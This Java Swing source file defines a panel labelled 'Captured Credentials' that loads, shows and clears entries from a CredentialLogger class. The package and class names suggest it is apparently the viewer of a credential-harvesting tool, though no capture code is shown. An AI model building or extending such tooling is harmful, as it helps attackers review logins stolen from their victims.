package org.guercifzone.DeepSeek.Gui;


import org.guercifzone.DeepSeek.CredentialLogger;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;

public class LogViewerPanel extends JPanel {
    private JTextArea logArea;

    public LogViewerPanel() {
        initComponents();
    }

    private void initComponents() {
        setLayout(new BorderLayout());

        // Title
        add(new JLabel("Captured Credentials", JLabel.CENTER), BorderLayout.NORTH);

        // Log area
        logArea = new JTextArea();
        logArea.setEditable(false);
        JScrollPane scrollPane = new JScrollPane(logArea);
        add(scrollPane, BorderLayout.CENTER);

        // Button panel
        JPanel buttonPanel = new JPanel();

        JButton refreshButton = new JButton("Refresh Logs");
        refreshButton.addActionListener(this::refreshLogs);
        buttonPanel.add(refreshButton);

        JButton clearButton = new JButton("Clear Logs");
        clearButton.addActionListener(this::clearLogs);
        buttonPanel.add(clearButton);

        add(buttonPanel, BorderLayout.SOUTH);

        // Load initial logs
        refreshLogs(null);
    }

    private void refreshLogs(ActionEvent e) {
        String logs = CredentialLogger.getLogsAsString();
        logArea.setText(logs);
        logArea.setCaretPosition(0); // Scroll to top
    }

    private void clearLogs(ActionEvent e) {
        int confirm = JOptionPane.showConfirmDialog(this,
                "Are you sure you want to clear all logs?",
                "Confirm Clear", JOptionPane.YES_NO_OPTION);

        if (confirm == JOptionPane.YES_OPTION) {
            CredentialLogger.clearLogs();
            refreshLogs(null);
        }
    }
}